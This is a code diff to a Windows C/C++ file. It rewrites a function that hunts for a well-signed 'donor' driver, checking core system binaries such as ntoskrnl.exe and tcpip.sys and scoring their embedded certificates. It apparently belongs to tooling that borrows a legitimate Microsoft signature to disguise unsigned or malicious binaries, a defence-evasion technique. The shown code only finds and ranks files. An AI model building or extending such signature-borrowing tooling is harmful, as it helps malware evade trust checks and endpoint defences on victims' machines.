@@ -1278,75 +1278,73 @@ static int ScoreDriverCert(LPCWSTR filePath)
     return score;
 }
 
-static BOOL ScanDirForSignedDriver(LPCWSTR dir, LPCWSTR pat, WCHAR* out, SIZE_T outCh, int* bestScore)
-{
-    WCHAR sp[MAX_PATH]; wcscpy_s(sp, dir); wcscat_s(sp, L"\\"); wcscat_s(sp, pat);
-    WIN32_FIND_DATAW fd; HANDLE hf = FindFirstFileW(sp, &fd);
-    if (hf == INVALID_HANDLE_VALUE) return FALSE;
-    BOOL better = FALSE;
-    do {
-        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
-        if (fd.nFileSizeLow < 8192) continue;
-        WCHAR fp[MAX_PATH]; wcscpy_s(fp, dir); wcscat_s(fp, L"\\"); wcscat_s(fp, fd.cFileName);
-        HANDLE h = CreateFileW(fp, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
-            nullptr, OPEN_EXISTING, 0, nullptr);
-        if (h == INVALID_HANDLE_VALUE) continue;
-        BYTE hdr[4096]; DWORD br2 = 0;
-        BOOL ok = ReadFile(h, hdr, sizeof(hdr), &br2, nullptr);
-        CloseHandle(h);
-        if (!ok || br2 < sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64)) continue;
-        PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)hdr;
-        if (d->e_magic != IMAGE_DOS_SIGNATURE) continue;
-        if ((DWORD)d->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > br2) continue;
-        PIMAGE_NT_HEADERS n = (PIMAGE_NT_HEADERS)(hdr + d->e_lfanew);
-        if (n->Signature != IMAGE_NT_SIGNATURE) continue;
-        IMAGE_DATA_DIRECTORY sd2 = {};
-        if (n->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
-            PIMAGE_NT_HEADERS64 n64 = (PIMAGE_NT_HEADERS64)n;
-            if (n64->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
-            sd2 = n64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];
-        } else continue;
-        if (sd2.VirtualAddress == 0 || sd2.Size < 128) continue;
-        int sc = ScoreDriverCert(fp);
-        if (sc > *bestScore) { *bestScore = sc; wcscpy_s(out, outCh, fp); better = TRUE; if (sc >= 1000) break; }
-    } while (FindNextFileW(hf, &fd));
-    FindClose(hf);
-    return better;
-}
-
-static void ScanDirRecursive(LPCWSTR dir, LPCWSTR pat, WCHAR* out, SIZE_T outCh, int* bestScore, int depth)
-{
-    if (depth <= 0 || *bestScore >= 1000) return;
-    ScanDirForSignedDriver(dir, pat, out, outCh, bestScore);
-    if (*bestScore >= 1000) return;
-    WCHAR sp[MAX_PATH]; if (wcslen(dir) + 3 >= MAX_PATH) return;
-    wcscpy_s(sp, dir); wcscat_s(sp, L"\\*");
-    WIN32_FIND_DATAW fd; HANDLE hf = FindFirstFileW(sp, &fd);
-    if (hf == INVALID_HANDLE_VALUE) return;
-    do {
-        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
-        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
-        if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) continue;
-        WCHAR sub[MAX_PATH]; if (wcslen(dir) + wcslen(fd.cFileName) + 2 >= MAX_PATH) continue;
-        wcscpy_s(sub, dir); wcscat_s(sub, L"\\"); wcscat_s(sub, fd.cFileName);
-        ScanDirRecursive(sub, pat, out, outCh, bestScore, depth - 1);
-        if (*bestScore >= 1000) break;
-    } while (FindNextFileW(hf, &fd));
-    FindClose(hf);
-}
-
 static BOOL FindSignedDonorDriver(WCHAR* out, SIZE_T outCh)
 {
     int bestScore = 0;
-    WCHAR dd[MAX_PATH]; GetSystemDirectoryW(dd, MAX_PATH); wcscat_s(dd, L"\\drivers");
-    ScanDirForSignedDriver(dd, L"*.sys", out, outCh, &bestScore);
-    if (bestScore < 1000) { WCHAR s32[MAX_PATH]; GetSystemDirectoryW(s32, MAX_PATH); ScanDirForSignedDriver(s32, L"*.sys", out, outCh, &bestScore); }
-    if (bestScore < 1000) { WCHAR s32[MAX_PATH]; GetSystemDirectoryW(s32, MAX_PATH); ScanDirForSignedDriver(s32, L"*.dll", out, outCh, &bestScore); }
-    if (bestScore < 1000) {
-        WCHAR ds[MAX_PATH]; GetWindowsDirectoryW(ds, MAX_PATH);
-        wcscat_s(ds, L"\\System32\\DriverStore\\FileRepository");
-        ScanDirRecursive(ds, L"*.sys", out, outCh, &bestScore, 2);
+    WCHAR sysDir[MAX_PATH];
+    GetSystemDirectoryW(sysDir, MAX_PATH);
+
+
+    const wchar_t* fast_targets[] = {
+        L"\\drivers\\tcpip.sys",
+        L"\\drivers\\ntfs.sys",
+        L"\\drivers\\ndis.sys",
+        L"\\drivers\\fltmgr.sys",
+        L"\\drivers\\dxgkrnl.sys",
+        L"\\drivers\\netio.sys",
+        L"\\ntoskrnl.exe"
+    };
+
+    for (int i = 0; i < _countof(fast_targets); i++) {
+        WCHAR path[MAX_PATH];
+        wcscpy_s(path, sysDir);
+        wcscat_s(path, fast_targets[i]);
+
+        if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES) {
+            int sc = ScoreDriverCert(path);
+            if (sc > bestScore) {
+                bestScore = sc;
+                wcscpy_s(out, outCh, path);
+                if (sc >= 1000) return TRUE;
+            }
+        }
     }
+
+
+    if (bestScore < 1000) {
+        WCHAR dd[MAX_PATH]; wcscpy_s(dd, sysDir); wcscat_s(dd, L"\\drivers");
+        WIN32_FIND_DATAW fd;
+        WCHAR sp[MAX_PATH]; wcscpy_s(sp, dd); wcscat_s(sp, L"\\*.sys");
+        HANDLE hf = FindFirstFileW(sp, &fd);
+        if (hf != INVALID_HANDLE_VALUE) {
+            int count = 0;
+            do {
+                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+                if (fd.nFileSizeLow < 8192) continue;
+                WCHAR fp[MAX_PATH]; wcscpy_s(fp, dd); wcscat_s(fp, L"\\"); wcscat_s(fp, fd.cFileName);
+
+
+                HANDLE h = CreateFileW(fp, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
+                if (h == INVALID_HANDLE_VALUE) continue;
+                BYTE hdr[4096]; DWORD br2 = 0;
+                BOOL ok = ReadFile(h, hdr, sizeof(hdr), &br2, nullptr);
+                CloseHandle(h);
+                if (!ok || br2 < sizeof(IMAGE_DOS_HEADER) + sizeof(IMAGE_NT_HEADERS64)) continue;
+                PIMAGE_DOS_HEADER d = (PIMAGE_DOS_HEADER)hdr;
+                if (d->e_magic != IMAGE_DOS_SIGNATURE) continue;
+
+                int sc = ScoreDriverCert(fp);
+                if (sc > bestScore) {
+                    bestScore = sc;
+                    wcscpy_s(out, outCh, fp);
+                    if (sc >= 1000) break;
+                }
+                if (++count >= 20) break;
+            } while (FindNextFileW(hf, &fd));
+            FindClose(hf);
+        }
+    }
+
     return (bestScore > 0);
 }
 
